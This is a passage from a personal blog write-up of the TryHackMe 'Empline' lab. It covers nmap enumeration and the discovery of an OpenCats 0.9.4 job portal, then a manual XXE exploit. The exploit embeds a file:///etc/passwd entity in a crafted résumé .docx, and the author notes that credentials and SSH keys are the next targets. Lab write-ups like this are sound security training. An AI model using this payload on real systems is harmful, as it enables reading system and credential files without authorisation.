---
layout: default
title : muzec - Haclabs NoName Writeup
---


### Enumeration With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -oA empline.txt <Target-IP>```


```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/empline]
└─$ nmap -sC -sV -oA empline.txt 10.10.46.229
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 15:38 WAT
Nmap scan report for 10.10.46.229
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 87
|   Capabilities flags: 63487
|   Some Capabilities: FoundRows, ConnectWithDatabase, DontAllowDatabaseTableColumn, Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, InteractiveClient, LongPassword, Speaks41ProtocolNew, SupportsCompression, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: X<c](O5YD(8#BdPDEkl\
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.17 seconds
```

Hello TryHackMe folks damn it been long i know so let hit on a new machine empline release probably last week i guess we have our scan result ready and seems we are having 3 open ports 22,80 and 3306 interesting right?? let start our enumeration with port 80.


![image](https://user-images.githubusercontent.com/69868171/134394687-48cccdf2-9186-488d-9755-5eb91281fcf4.png)

A nice webpage i will say seems we have some pages let check it out, Going through the pages i found a subdomain on the `Employment` page `job.empline.thm` let try to add it our hosts file on our attacking machine.

![image](https://user-images.githubusercontent.com/69868171/134395433-847cd031-405f-4aa2-9696-da9901fa9560.png)

Accessing `http://job.empline.thm/` we are presented with a login page which is powered by opencats.

![image](https://user-images.githubusercontent.com/69868171/134395656-b352565f-780d-42a8-81bd-01072ecd7d2e.png)

What i always check first is version always version and guess what?? opencats is running Version 0.9.4 so i quickly hit google to check if it vulnerable.

![image](https://user-images.githubusercontent.com/69868171/134396268-eeb1d15e-b09b-4b59-a83a-8ff5d456b129.png)

And i found out OpenCats 0.9.4-2  is vulnerable to 'docx ' XML External Entity Injection (XXE). We also have the exploit written in python on exploit-db but what is the fun without trying it manually why run an exploit when we can learn more from doing it manually.

### EXPLOITING THE OPENCATS 0.9.4

![image](https://user-images.githubusercontent.com/69868171/134396940-cf162209-8928-4c95-94c4-3cf7f4f4a830.png)

```
URL:- http://job.empline.thm/careers/
```

Now let click on ` current opening positions` .

![image](https://user-images.githubusercontent.com/69868171/134397180-0b172e99-d73c-4093-8322-355ada98a2f1.png)

Next:- Now click on `Mobile Dev` .

![image](https://user-images.githubusercontent.com/69868171/134397305-1964261f-fe46-47a1-ae9e-e6f4075eabc5.png)


Next:- Now Click on `Apply To Postion` .


![image](https://user-images.githubusercontent.com/69868171/134397581-8b878a69-7880-4bbd-b9bf-ce81017a80c7.png)

Now the fun part begin let create a file called `cv.py` with the python code below;- 

```
from docx import Document
document = Document()
paragraph = document.add_paragraph("Muzec")
document.save("resume.docx")
```
Now let Run the cv.py a resume.docx file has been created. Unzip the resume.docx.

![image](https://user-images.githubusercontent.com/69868171/134402779-894f1fc6-5a68-4005-b5fc-62a253ce7d75.png)


cd (change directory) to word/ use your nano editor and open document.xml.

![image](https://user-images.githubusercontent.com/69868171/134402914-e89172a9-3988-4d21-826b-d47cee688c35.png)


After the first line where <?xml starts, embed the following: `<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>` .

![image](https://user-images.githubusercontent.com/69868171/134403145-491c89fe-bec0-4854-87ef-39a4eb806f19.png)


Now let find where our name is written in the document.xml. The code will look something like this:

```
<w:body><w:p><w:r><w:t>YOUR_NAME</w:t></w:r 
```

![image](https://user-images.githubusercontent.com/69868171/134403613-c61401f7-51d5-431d-a8d2-5721073cb6be.png)


Now let remove our name and write `"&test;"`. It will look like this:

![image](https://user-images.githubusercontent.com/69868171/134403929-c353c545-c0da-4c9e-ba29-c6b9c3144496.png)


Let Save the file and exit. Go out of the word/ directory and zip our resume.docx back with document.xml using this command `zip resume.docx word/document.xml` . 

![image](https://user-images.githubusercontent.com/69868171/134404176-5d60f1aa-b7fa-460f-94d0-7302cf13d0cc.png)

Now back to our target let upload the `resume.docx` .

![image](https://user-images.githubusercontent.com/69868171/134404339-c0e5a94c-4eb8-4203-84aa-ba1a08d53dfd.png)

Boom and the contents of `/etc/passwd` is presented to you in the input field. Now what is next is try to find a config file to read using the XML injection  yes credentials credentials or a private key for SSH is the main thing.

